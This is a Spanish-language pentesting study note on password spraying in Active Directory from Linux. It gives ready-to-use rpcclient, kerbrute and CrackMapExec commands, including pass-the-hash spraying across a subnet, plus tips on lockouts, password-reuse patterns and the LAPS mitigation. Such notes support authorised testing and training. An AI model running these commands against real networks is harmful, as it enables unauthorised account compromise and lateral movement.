---
tags:
  - AD
  - linux
  - spraying
---
## Conceptos Clave 

* El Password Spraying interno es una vía principal para obtener acceso mediante credenciales de dominio, pero requiere precaución.
* Consiste en probar una única contraseña probable contra una lista generada previamente de usuarios válidos.
* La reutilización de contraseñas de cuentas de administrador local es generalizada debido al uso de imágenes base (gold images) en despliegues automatizados.
* Es posible intentar el acceso utilizando contraseñas en texto claro o hashes NTLM a lo largo de una subred o múltiples hosts.

  
## Herramientas Clave

* **rpcclient:** Opción excelente para ejecutar ataques desde Linux integrándolo en bucles de Bash.
* **kerbrute:** Herramienta especializada para realizar password spraying validando a través del KDC.
* **[NetExec](../../../📂%2008%20Herramientas&Cheatsheets/NetExec.md)** Herramienta versátil que permite spraying de listas de texto, validación rápida de credenciales y autenticación mediante hashes NTLM (Pass-The-Hash).

  
## Metodología Paso a Paso

* **Fase 1: Ejecución del ataque contra el dominio:** Una vez obtenida una lista de usuarios válidos, se ejecuta el ataque usando una sola contraseña. Es necesario utilizar filtros en consola (ej. grep) para limpiar la salida e identificar rápidamente los intentos válidos entre múltiples líneas.

* **Fase 2: Validación de credenciales:** Tras obtener uno o más aciertos, se deben validar las credenciales rápidamente contra el Controlador de Dominio para confirmar el acceso.

* **Fase 3: Reutilización de contraseñas locales (Movimiento Lateral):** Si se obtiene acceso administrativo y se extrae una contraseña en claro o hash NTLM, se prueba en otros equipos de la red. Se priorizan servidores de alto valor (como SQL o Exchange) donde pueden existir credenciales persistentes en memoria de usuarios privilegiados.

  
## Cheat Sheet de Comandos
```bash
# Bucle de Bash con rpcclient.

# -U: Especifica el formato de usuario y contraseña ("usuario%contraseña").

# -c: Pasa el comando "getusername;quit".

# grep Authority: Filtra la salida para mostrar solo intentos exitosos (los errores no muestran esta palabra).

for u in $(cat <USER_LIST_FILE>);do rpcclient -U "$u%<PASSWORD>" -c "getusername;quit" <TARGET_DC_IP> | grep Authority; done
```
  
```bash
# Spraying mediante Kerberos usando Kerbrute.

# passwordspray: Módulo a utilizar.

# -d: Especifica el dominio objetivo.

# --dc: Especifica la IP del Controlador de Dominio.

kerbrute passwordspray -d <DOMAIN> --dc <TARGET_DC_IP> <USER_LIST_FILE> <PASSWORD>
```
  
```bash
# Spraying por SMB usando CrackMapExec.

# -u: Lista de usuarios a probar.

# -p: Contraseña única a utilizar.

# grep +: Filtra los fallos de inicio de sesión mostrando solo los accesos válidos (+).

sudo crackmapexec smb <TARGET_DC_IP> -u <USER_LIST_FILE> -p <PASSWORD> | grep +
```
  
```bash
# Validación de un "hit" específico con CrackMapExec.

# Se usa contra el DC para confirmar que la cuenta y clave son funcionales.

sudo crackmapexec smb <TARGET_DC_IP> -u <VALID_USER> -p <VALID_PASSWORD>
```
  
```bash
# Spraying de Administrador Local (Pass-The-Hash) con CrackMapExec.

# --local-auth: CRÍTICO. Obliga a usar la base de datos local (SAM) y evita bloquear la cuenta en el dominio.

# -H: Especifica el hash NTLM.

# Apunta a un segmento de red entero en lugar de un solo host.

sudo crackmapexec smb --local-auth <TARGET_SUBNET/CIDR> -u <LOCAL_ADMIN_USER> -H <NTLM_HASH> | grep +
```

  
## "Gotchas" y Troubleshooting

* Con `rpcclient`, un inicio de sesión válido no es evidente de inmediato; la respuesta que incluye "Authority Name" indica éxito, por lo que filtrar la salida es obligatorio.

* Al realizar spraying sobre cuentas de administrador local con CrackMapExec, la bandera `--local-auth` es obligatoria. Sin ella, la herramienta intentará autenticarse contra el dominio por defecto, lo que puede causar bloqueos de cuenta rápidamente.

* Las convenciones de contraseñas suelen tener variaciones; si un equipo de escritorio tiene la clave `$desktop%@admin123`, es probable que un servidor use `$server%@admin123`.

* Las cuentas no estándar de administradores locales pueden compartir contraseña con cuentas de usuario de dominio de nombres similares, e incluso ocurre entre dominios que mantienen relaciones de confianza.

* Una contraseña de un usuario de dominio podría ser reutilizada en su respectiva cuenta de administrador (ej. usuario `ajones` y su cuenta de admin `ajones_adm`).

* La técnica de spraying local a lo largo de subredes es muy ruidosa y no es apta para evaluaciones que requieran sigilo.

* Microsoft Local Administrator Password Solution (LAPS) es la mitigación principal para la reutilización de claves locales.